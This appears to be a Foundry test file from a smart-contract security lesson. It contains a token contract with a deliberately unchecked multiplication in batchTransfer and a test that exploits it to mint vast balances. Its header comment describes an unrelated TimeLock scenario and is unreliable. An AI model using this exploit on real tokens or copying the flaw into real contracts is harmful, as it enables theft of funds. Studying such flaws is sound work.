// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

import "forge-std/Test.sol";


// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0

What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.
*/

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract OverflowToken {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
        uint cnt = _receivers.length;
        uint256 amount = uint256(cnt) * _value;
        require(cnt > 0 && cnt <= 20);
        require(_value > 0 && balances[msg.sender] >= amount);

        balances[msg.sender] = balances[msg.sender].sub(amount);
        for (uint i = 0; i < cnt; i++) {
            balances[_receivers[i]] = balances[_receivers[i]].add(_value);
            emit Transfer(msg.sender, _receivers[i], _value);
            console.log("event:", msg.sender, _receivers[i], _value);
        }
        return true;
    }
}

contract ContractTest is Test {
    OverflowToken OverflowTokenContract;
    address alice;
    address bob;
    function setUp() public {
        OverflowTokenContract = new OverflowToken();
        alice = vm.addr(1);
        bob = vm.addr(2);
    }    

    function testOverflow() public {
        console.log("Alice balance", OverflowTokenContract.balanceOf(alice));
        console.log("Bob balance", OverflowTokenContract.balanceOf(bob));

        console.log("Alice invoke batchTransfer...");
        vm.prank(alice);
        address[] memory receives = new address[](2);
        receives[0] = address(alice);
        receives[1] = address(bob);
        uint256 amount = 2**256/2;
        OverflowTokenContract.batchTransfer(receives, amount);
        console.log("Alice balance", OverflowTokenContract.balanceOf(alice));
        console.log("Bob balance", OverflowTokenContract.balanceOf(bob));
    }
}
